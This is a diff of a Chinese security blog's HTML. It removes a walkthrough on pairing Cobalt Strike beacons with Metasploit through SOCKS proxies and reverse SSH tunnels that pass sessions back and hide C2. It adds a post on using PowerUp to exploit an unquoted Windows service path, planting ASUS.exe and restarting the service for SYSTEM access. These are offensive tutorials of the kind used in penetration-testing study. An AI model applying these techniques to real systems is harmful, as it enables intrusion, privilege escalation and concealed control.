@@ -437,7 +437,7 @@
         
           <h1 class="post-title" itemprop="name headline">
                 
-                <a class="post-title-link" href="/2019/08/26/1566846777/" itemprop="url">CobaltStrike+MetaSploit联动攻击</a></h1>
+                <a class="post-title-link" href="/2019/08/26/1566846777/" itemprop="url">Window下使用PowerUp辅助提权</a></h1>
         
 
         <div class="post-meta">
@@ -472,8 +472,8 @@
               
               
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/渗透/" itemprop="url" rel="index">
-                    <span itemprop="name">渗透</span>
+                  <a href="/categories/提权/" itemprop="url" rel="index">
+                    <span itemprop="name">提权</span>
                   </a>
                 </span>
 
@@ -511,41 +511,16 @@
       
         
           
-            <h1 id="CobaltStrike-MetaSploit联动攻击"><a href="#CobaltStrike-MetaSploit联动攻击" class="headerlink" title="CobaltStrike+MetaSploit联动攻击"></a>CobaltStrike+MetaSploit联动攻击</h1><p>** 本文源于klion红队攻防揭秘  观后复现 **</p>
-<h2 id="重点"><a href="#重点" class="headerlink" title="重点"></a>重点</h2><blockquote>
-<p>1，通过beacon内置socks，将msf带入目标内网<br>2，使用CS的外部tcp监听器，通过ssh隧道派生一个session到msf<br>3，使用msf的exp直接弹回一个beacon<br>4，灵活使用ssh隧道深度隐藏C2</p>
-</blockquote>
-<h2 id="通过beacon内置socks，将msf带入目标内网"><a href="#通过beacon内置socks，将msf带入目标内网" class="headerlink" title="通过beacon内置socks，将msf带入目标内网"></a>通过beacon内置socks，将msf带入目标内网</h2><p>** CS **</p>
-<ul>
-<li>beacon&gt; getuid</li>
-<li>beacon&gt; socks 1080<br><img src="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/07/29/CobaltStrike+MetaSploit%E8%81%94%E5%8A%A8%E6%8A%80%E5%B7%A7/5.png" alt="avatar"></li>
-<li><ul>
-<li>msf **</li>
-</ul>
-</li>
-<li>msf5 &gt; setg Proxies socks4:XXX.XXX.XXX.XXX:1080  //设置代理</li>
-<li>msf5 &gt; setg ReversseAllowProxy true  //双向通道</li>
-</ul>
-<p>现在就可以直接用msf的auxiliary模块扫描目标内网了<br><img src="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/07/29/CobaltStrike+MetaSploit%E8%81%94%E5%8A%A8%E6%8A%80%E5%B7%A7/3.png" alt="avatar"></p>
-<h2 id="使用CS的外部tcp监听器，通过ssh隧道派生一个session到msf"><a href="#使用CS的外部tcp监听器，通过ssh隧道派生一个session到msf" class="headerlink" title="使用CS的外部tcp监听器，通过ssh隧道派生一个session到msf **"></a>使用CS的外部tcp监听器，通过ssh隧道派生一个session到msf **</h2><p><strong>* 首先创建CS外部tcp监听器 *</strong><br><img src="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/07/29/CobaltStrike+MetaSploit%E8%81%94%E5%8A%A8%E6%8A%80%E5%B7%A7/4.png" alt="avatar"><br><strong>* 然后到本地机器msf创建tcp监听器 *</strong><br><img src="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/07/29/CobaltStrike+MetaSploit%E8%81%94%E5%8A%A8%E6%8A%80%E5%B7%A7/8.png" alt="avatar"><br><strong>* 随后，在vps机器上编辑sshd配置，开启ssh转发功能，重启ssh服务，这是所有使用ssh隧道转发前的必备操作。 *</strong></p>
-<pre><code># vi/etc/ssh/sshd_config
-AllowTcpForwarding yes
-GatewayPorts yes
-TCPKeepAlive yes
-PasswordAuthentication yes
-# systemctl restartsshd.service</code></pre><p><strong>* 回到本地linux中并通过ssh隧道做好ssh转发，意思就是通过vps把来自外部的8080端口流量全部转到本地linux的8080端口上，而本地linux的8080端口上跑的又正好是msf的监听器，所以，最终才会造成meterpreter本地上线的效果 *</strong></p>
-<pre><code># ssh -C -f -N -g -R 0.0.0.0:8080:192.168.0.108:8080 root@xxx.xxx.xxx.xxx -p 22 //建立ssh隧道
-&gt;  -C     //压缩数据 
-&gt;  -f     //运行在后台
-&gt;  -N     //不远程执行命令，对端口转发很有用
-&gt;  -g     //允许远程主机连接到本地转发端口
-&gt;  -R     //[bind_address:]port:host:hostport  端口及地址配置
-# netstat -tulnp | grep &apos;8080&apos; //检查通道是否成功建立</code></pre><p><img src="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/07/29/CobaltStrike+MetaSploit%E8%81%94%E5%8A%A8%E6%8A%80%E5%B7%A7/7.png" alt="avatar"><br><img src="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/07/29/CobaltStrike+MetaSploit%E8%81%94%E5%8A%A8%E6%8A%80%E5%B7%A7/6.png" alt="avatar"></p>
-<p>   <strong>* 最后，回到cs上选择目标内网指定机器的beacon shell 点击 “Spawn” 派生，再选择刚在上面创建好的tcp的外部监听器，相应目标机器的meterpreter就会被直接弹到本地，也可以选择批量操作 *</strong></p>
-<h2 id="使用msf的exp直接弹回一个beacon"><a href="#使用msf的exp直接弹回一个beacon" class="headerlink" title="使用msf的exp直接弹回一个beacon"></a>使用msf的exp直接弹回一个beacon</h2><p>** 暂时复现失败 ** </p>
-<h2 id="灵活利用ssh隧道深度隐藏C2"><a href="#灵活利用ssh隧道深度隐藏C2" class="headerlink" title="灵活利用ssh隧道深度隐藏C2"></a>灵活利用ssh隧道深度隐藏C2</h2><blockquote>
-<p>首先，创建一个普通的http 反向beacon监听器，并用该监听器生成一个64位的exe payload，随后再立即删除该监听器<br>然后本地开启ssh隧道转发，转发刚刚删除的监听器的端口。<br>本地启动cs服务，监听转发的端口，监听器与删除监听器配置相同。<br>当payload执行，本地服务上线。<br><img src="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/07/29/CobaltStrike+MetaSploit%E8%81%94%E5%8A%A8%E6%8A%80%E5%B7%A7/cs&msf.png" alt="avatar"></p>
-</blockquote>
+            <h1 id="Window下使用PowerUp辅助提权"><a href="#Window下使用PowerUp辅助提权" class="headerlink" title="Window下使用PowerUp辅助提权"></a>Window下使用PowerUp辅助提权</h1><p><strong>*  前言 *</strong>：每当获得shell的时候，提权总是一件很重要的事情，虽然在很多时候提权没那么必要，但是能灵活的提权才是在系统中常驻的基石。在现如今主流渗透框架的自动提权模块被各大AV厂商和补丁围杀渡劫下，在严格一点的环境，基本上没有任何用处，加上内核提权可能出现的崩溃蓝屏，反而容易打草惊蛇，得不偿失。PowerUp是在我尝试过各种提权手段后，个人觉得最为灵活，好用的提权辅助。</p>
+<h2 id="PowerUp"><a href="#PowerUp" class="headerlink" title="PowerUp"></a>PowerUp</h2><p>PowerUp是PowerSploit中的提权辅助脚本，整合所有因为配置错误而导致的Windows本地权限提权向量。，例如：** 不带引号的服务路径，不安全的服务权限，不安全的文件系统权限，AlwaysInstallElevated，注册表……. **这些都是属于杀软与补丁难以管辖的无主之地，而我们所需要做的只是发现并稍加利用， 一切就尽在掌控之中了。              </p>
+<pre><code>https://github.com/PowerShellMafia/PowerSploit     //PowerSploit的GitHub地址</code></pre><p>在本机杀软和补丁齐全的情况下，依旧检测出了多处可用于提权的配置缺陷。<br> <img src="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/07/30/Window%E4%B8%8B%E4%BD%BF%E7%94%A8PowerUp%E8%BE%85%E5%8A%A9%E6%8F%90%E6%9D%83/1.png" alt="avatar"><br> <img src="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/07/30/Window%E4%B8%8B%E4%BD%BF%E7%94%A8PowerUp%E8%BE%85%E5%8A%A9%E6%8F%90%E6%9D%83/3.png" alt="avatar"><br>这里我选择了最方便的服务路径提权，首先上传ASUS.exe到C:\Program Files\ASUSTek COMPUTER INC\目录下。</p>
+<p>原因：Windows命令解释程序可能会遇到名称中的空格，并且希望通过将字符串包装在引号中来对它们进行转义。在这个示例中，如果系统运行该服务，它将尝试运行以下可执行文件：</p>
+<pre><code>C:\Program.exe
+C:\Program Files\ASUSTek.exe
+C:\Program Files\ASUSTek COMPUTER.exe
+C:\Program Files\ASUSTek COMPUTER INC\ASUS.exe</code></pre><p>这样层层寻找就会找到并运行上传的的ASUS.exe,然后就不会继续向下寻找了，此时ASUS.exe就是系统会启动的服务程序。</p>
+<p>通过重启服务返回了SYSTEM的session</p>
+<pre><code>sc restart ASUSGamingControlService     //重启服务</code></pre><p> <img src="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/07/30/Window%E4%B8%8B%E4%BD%BF%E7%94%A8PowerUp%E8%BE%85%E5%8A%A9%E6%8F%90%E6%9D%83/4.png" alt="avatar"></p>
 
           
         
